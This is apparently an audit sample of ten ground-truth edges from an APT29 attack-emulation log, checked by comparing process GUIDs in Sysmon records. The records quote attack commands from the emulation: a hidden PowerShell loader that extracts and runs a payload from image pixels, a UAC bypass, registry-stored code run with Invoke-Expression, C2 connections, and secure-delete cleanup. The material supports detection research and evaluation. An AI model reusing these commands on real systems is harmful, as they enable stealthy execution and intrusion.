# APT29 Day 1 ground-truth audit sample

> **How to use this file.** Ten edges from the day 1 key, chosen at random.
> For each, compare the values shown and tick one box. Put an `x` between the
> brackets like `- [x]`. No security knowledge needed — every check is a
> comparison you can do by eye. Roughly two minutes each.
>
> Note: `â€®` in a filename is a right-to-left override character. It is not
> corruption — it is the masquerading trick from step 1.A, which makes a `.scr`
> file display as `.doc`.

Random sample: `random.Random(20260731).sample(true_edge_ids, 10)`. Each event
identity is the one-based line number in the SHA-256-pinned source log recorded
in `apt29-day1.edges.yaml`. For EID 3, this corpus has no `CommandLine` or
`ParentProcessGuid`; its `ProcessGuid` is the join field.

## GT-D1-002 — payload process opened the initial C2 connection

Plan step `1.A`; command: `Double click 3aka3.doc on C:\programdata\victim\`.

```text
Source (EID 1, line 373)
EventTime: 2020-05-01 22:55:56
Hostname: SCRANTON.dmevals.local
Image: C:\ProgramData\victim\â€®cod.3aka3.scr
CommandLine: "C:\ProgramData\victim\â€®cod.3aka3.scr" /S
ProcessGuid: {47ab858c-e13c-5eac-a903-000000000400}
ParentProcessGuid: {47ab858c-dac4-5eac-f202-000000000400}

Target (EID 3, line 567)
EventTime: 2020-05-01 22:56:00
Hostname: SCRANTON.dmevals.local
Image: C:\ProgramData\victim\â€®cod.3aka3.scr
CommandLine: <not present on EID 3>
ProcessGuid: {47ab858c-e13c-5eac-a903-000000000400}
SourceIp: 10.0.1.4  DestinationIp: 192.168.0.5  DestinationPort: 1234
```

Claimed relation: `PROCESS_OPENED_CONNECTION`.

Check: the two `ProcessGuid` values and the host match exactly; the second record is the payload's port-1234 connection.


**Your verdict:**

- [ ] correct — the values match, this edge is real
- [ ] wrong — they do not match
- [ ] unsure — ambiguous, do not score this edge

## GT-D1-018 — elevated PowerShell spawned AccessChk

Plan step `6.A`; command: `& "C:\Program Files\SysinternalsSuite\accesschk.exe"`.

```text
Source (EID 1, line 27185)
EventTime: 2020-05-01 23:00:13
Hostname: SCRANTON.dmevals.local
Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
CommandLine: powershell.exe
ProcessGuid: {47ab858c-e23d-5eac-c603-000000000400}
ParentProcessGuid: {47ab858c-e1e4-5eac-b803-000000000400}

Target (EID 1, line 52209)
EventTime: 2020-05-01 23:04:34
Hostname: SCRANTON.dmevals.local
Image: C:\Program Files\SysinternalsSuite\accessChk.exe
CommandLine: "C:\Program Files\SysinternalsSuite\accesschk.exe"
ProcessGuid: {47ab858c-e342-5eac-d703-000000000400}
ParentProcessGuid: {47ab858c-e23d-5eac-c603-000000000400}
```

Claimed relation: `SPAWNED`.

Check: the target's `ParentProcessGuid` is exactly the source's `ProcessGuid` on the same host.


**Your verdict:**

- [ ] correct — the values match, this edge is real
- [ ] wrong — they do not match
- [ ] unsure — ambiguous, do not score this edge

## GT-D1-016 — elevated PowerShell spawned the Draft.Zip deletion tool

Plan step `4.B`; command: `.\sdelete64.exe /accepteula "$env:APPDATA\Draft.Zip"`.

```text
Source (EID 1, line 27185)
EventTime: 2020-05-01 23:00:13
Hostname: SCRANTON.dmevals.local
Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
CommandLine: powershell.exe
ProcessGuid: {47ab858c-e23d-5eac-c603-000000000400}
ParentProcessGuid: {47ab858c-e1e4-5eac-b803-000000000400}

Target (EID 1, line 48961)
EventTime: 2020-05-01 23:03:14
Hostname: SCRANTON.dmevals.local
Image: C:\Program Files\SysinternalsSuite\sdelete64.exe
CommandLine: "C:\Program Files\SysinternalsSuite\sdelete64.exe" /accepteula C:\Users\pbeesly\AppData\Roaming\Draft.Zip
ProcessGuid: {47ab858c-e2f2-5eac-d203-000000000400}
ParentProcessGuid: {47ab858c-e23d-5eac-c603-000000000400}
```

Claimed relation: `SPAWNED`.

Check: compare the target's parent GUID with the PowerShell process GUID; the target command explicitly names Draft.Zip.


**Your verdict:**

- [ ] correct — the values match, this edge is real
- [ ] wrong — they do not match
- [ ] unsure — ambiguous, do not score this edge

## GT-D1-034 — startup PowerShell spawned hostui.exe

Plan step `10.B`; command: `Trigger the Startup Folder persistence by logging in to Windows SCRANTON`.

```text
Source (EID 1, line 183900)
EventTime: 2020-05-01 23:21:19
Hostname: SCRANTON.dmevals.local
Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
CommandLine: powershell.exe  -c "Start-Process C:\Windows\System32\hostui.exe -verb runas"
ProcessGuid: {47ab858c-e72f-5eac-f400-000000000500}
ParentProcessGuid: {47ab858c-e72f-5eac-f200-000000000500}

Target (EID 1, line 185073)
EventTime: 2020-05-01 23:21:27
Hostname: SCRANTON.dmevals.local
Image: C:\Windows\System32\hostui.exe
CommandLine: "C:\Windows\System32\hostui.exe"
ProcessGuid: {47ab858c-e737-5eac-fa00-000000000500}
ParentProcessGuid: {47ab858c-e72f-5eac-f400-000000000500}
```

Claimed relation: `SPAWNED`.

Check: the PowerShell command says it starts hostui.exe, and the hostui event names that PowerShell GUID as parent.


**Your verdict:**

- [ ] correct — the values match, this edge is real
- [ ] wrong — they do not match
- [ ] unsure — ambiguous, do not score this edge

## GT-D1-008 — control.exe spawned the hidden UAC-bypass PowerShell

Plan step `3.B`; command sequence ends with `%windir%\system32\sdclt.exe` after registering the hidden PowerShell command under `HKCU\Software\Classes\Folder\shell\open\command`.

```text
Source (EID 1, line 6747)
EventTime: 2020-05-01 22:58:43
Hostname: SCRANTON.dmevals.local
Image: C:\Windows\System32\control.exe
CommandLine: "C:\Windows\System32\control.exe"  /name Microsoft.BackupAndRestoreCenter
ProcessGuid: {47ab858c-e1e3-5eac-b603-000000000400}
ParentProcessGuid: {47ab858c-e1e3-5eac-b503-000000000400}

Target (EID 1, line 6930)
EventTime: 2020-05-01 22:58:44
Hostname: SCRANTON.dmevals.local
Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
CommandLine: "PowerShell.exe" -noni -noexit -ep bypass -window hidden -c "sal a New-Object;Add-Type -AssemblyName 'System.Drawing'; $g=a System.Drawing.Bitmap('C:\Users\pbeesly\Downloads\monkey.png');$o=a Byte[] 4480;for($i=0; $i -le 6; $i++){foreach($x in(0..639)){$p=$g.GetPixel($x,$i);$o[$i*640+$x]=([math]::Floor(($p.B-band15)*16)-bor($p.G-band15))}};$g.Dispose();IEX([System.Text.Encoding]::ASCII.GetString($o[0..3932]))"
ProcessGuid: {47ab858c-e1e4-5eac-b803-000000000400}
ParentProcessGuid: {47ab858c-e1e3-5eac-b603-000000000400}
```

Claimed relation: `SPAWNED`.

Check: the target is the hidden bypass PowerShell shown in the plan, and its parent GUID equals control.exe's process GUID.


**Your verdict:**

- [ ] correct — the values match, this edge is real
- [ ] wrong — they do not match
- [ ] unsure — ambiguous, do not score this edge

## GT-D1-033 — startup cmd.exe spawned its PowerShell helper

Plan step `10.B`; command: `Trigger the Startup Folder persistence by logging in to Windows SCRANTON`.

```text
Source (EID 1, line 183718)
EventTime: 2020-05-01 23:21:19
Hostname: SCRANTON.dmevals.local
Image: C:\Windows\System32\cmd.exe
CommandLine: C:\windows\system32\cmd.exe /c ""C:\Windows\System32\hostui.bat" "
ProcessGuid: {47ab858c-e72f-5eac-f200-000000000500}
ParentProcessGuid: {47ab858c-e713-5eac-cc00-000000000500}

Target (EID 1, line 183900)
EventTime: 2020-05-01 23:21:19
Hostname: SCRANTON.dmevals.local
Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
CommandLine: powershell.exe  -c "Start-Process C:\Windows\System32\hostui.exe -verb runas"
ProcessGuid: {47ab858c-e72f-5eac-f400-000000000500}
ParentProcessGuid: {47ab858c-e72f-5eac-f200-000000000500}
```

Claimed relation: `SPAWNED`.

Check: `hostui.bat` runs under cmd.exe, whose GUID is the direct parent GUID of the PowerShell helper.


**Your verdict:**

- [ ] correct — the values match, this edge is real
- [ ] wrong — they do not match
- [ ] unsure — ambiguous, do not score this edge

## GT-D1-029 — NASHUA Python agent spawned cmd.exe for cleanup

Plan step `9.C`; command begins `[meterpreter] > shell`, then runs the sdelete commands from `C:\Windows\Temp`.

```text
Source (EID 1, line 102644)
EventTime: 2020-05-01 23:15:04
Hostname: NASHUA.dmevals.local
Image: C:\Windows\Temp\python.exe
CommandLine: "C:\Windows\Temp\python.exe"
ProcessGuid: {5aa8ec29-e5b8-5eac-7903-000000000400}
ParentProcessGuid: {5aa8ec29-e5b7-5eac-7703-000000000400}

Target (EID 1, line 112664)
EventTime: 2020-05-01 23:16:40
Hostname: NASHUA.dmevals.local
Image: C:\Windows\System32\cmd.exe
CommandLine: C:\windows\system32\cmd.exe
ProcessGuid: {5aa8ec29-e618-5eac-7e03-000000000400}
ParentProcessGuid: {5aa8ec29-e5b8-5eac-7903-000000000400}
```

Claimed relation: `SPAWNED`.

Check: the cmd.exe target has the Python agent's exact process GUID in `ParentProcessGuid`.


**Your verdict:**

- [ ] correct — the values match, this edge is real
- [ ] wrong — they do not match
- [ ] unsure — ambiguous, do not score this edge

## GT-D1-005 — Pupy's second cmd.exe spawned PowerShell

Plan step `3.A`; command sequence: `[pupy] > shell` then `[pupy CMD] > powershell`.

```text
Source (EID 1, line 3876)
EventTime: 2020-05-01 22:57:12
Hostname: SCRANTON.dmevals.local
Image: C:\Windows\System32\cmd.exe
CommandLine: "C:\windows\system32\cmd.exe"
ProcessGuid: {47ab858c-e188-5eac-b003-000000000400}
ParentProcessGuid: {47ab858c-e13c-5eac-a903-000000000400}

Target (EID 1, line 3965)
EventTime: 2020-05-01 22:57:15
Hostname: SCRANTON.dmevals.local
Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
CommandLine: powershell
ProcessGuid: {47ab858c-e18b-5eac-b103-000000000400}
ParentProcessGuid: {47ab858c-e188-5eac-b003-000000000400}
```

Claimed relation: `SPAWNED`.

Check: the target command is literally `powershell`, and its parent GUID is the cmd.exe GUID.


**Your verdict:**

- [ ] correct — the values match, this edge is real
- [ ] wrong — they do not match
- [ ] unsure — ambiguous, do not score this edge

## GT-D1-012 — hidden UAC-bypass PowerShell opened the HTTPS C2 connection

Plan step `3.B`; the command installs the bypass command and invokes `sdclt.exe`, expecting a Meterpreter callback over port 443.

```text
Source (EID 1, line 6930)
EventTime: 2020-05-01 22:58:44
Hostname: SCRANTON.dmevals.local
Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
CommandLine: "PowerShell.exe" -noni -noexit -ep bypass -window hidden -c "sal a New-Object;Add-Type -AssemblyName 'System.Drawing'; $g=a System.Drawing.Bitmap('C:\Users\pbeesly\Downloads\monkey.png');$o=a Byte[] 4480;for($i=0; $i -le 6; $i++){foreach($x in(0..639)){$p=$g.GetPixel($x,$i);$o[$i*640+$x]=([math]::Floor(($p.B-band15)*16)-bor($p.G-band15))}};$g.Dispose();IEX([System.Text.Encoding]::ASCII.GetString($o[0..3932]))"
ProcessGuid: {47ab858c-e1e4-5eac-b803-000000000400}
ParentProcessGuid: {47ab858c-e1e3-5eac-b603-000000000400}

Target (EID 3, line 7665)
EventTime: 2020-05-01 22:58:46
Hostname: SCRANTON.dmevals.local
Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
CommandLine: <not present on EID 3>
ProcessGuid: {47ab858c-e1e4-5eac-b803-000000000400}
SourceIp: 10.0.1.4  DestinationIp: 192.168.0.5  DestinationPort: 443
```

Claimed relation: `PROCESS_OPENED_CONNECTION`.

Check: the connection record reuses the hidden PowerShell process GUID and has the plan's port 443 destination.


**Your verdict:**

- [ ] correct — the values match, this edge is real
- [ ] wrong — they do not match
- [ ] unsure — ambiguous, do not score this edge

## GT-D1-035 — hostui.exe spawned the registry-reading PowerShell

Plan step `10.B`; command: `Trigger the Startup Folder persistence by logging in to Windows SCRANTON`.

```text
Source (EID 1, line 185073)
EventTime: 2020-05-01 23:21:27
Hostname: SCRANTON.dmevals.local
Image: C:\Windows\System32\hostui.exe
CommandLine: "C:\Windows\System32\hostui.exe"
ProcessGuid: {47ab858c-e737-5eac-fa00-000000000500}
ParentProcessGuid: {47ab858c-e72f-5eac-f400-000000000500}

Target (EID 1, line 185395)
EventTime: 2020-05-01 23:21:27
Hostname: SCRANTON.dmevals.local
Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
CommandLine: powershell.exe -c "Get-ItemPropertyValue 'HKLM:\\SOFTWARE\\Javasoft' 'value Supplement' | Invoke-Expression"
ProcessGuid: {47ab858c-e737-5eac-fe00-000000000500}
ParentProcessGuid: {47ab858c-e737-5eac-fa00-000000000500}
```

Claimed relation: `SPAWNED`.

Check: the target's parent GUID is hostui.exe's process GUID, so the registry-reading PowerShell is a direct child.


**Your verdict:**

- [ ] correct — the values match, this edge is real
- [ ] wrong — they do not match
- [ ] unsure — ambiguous, do not score this edge
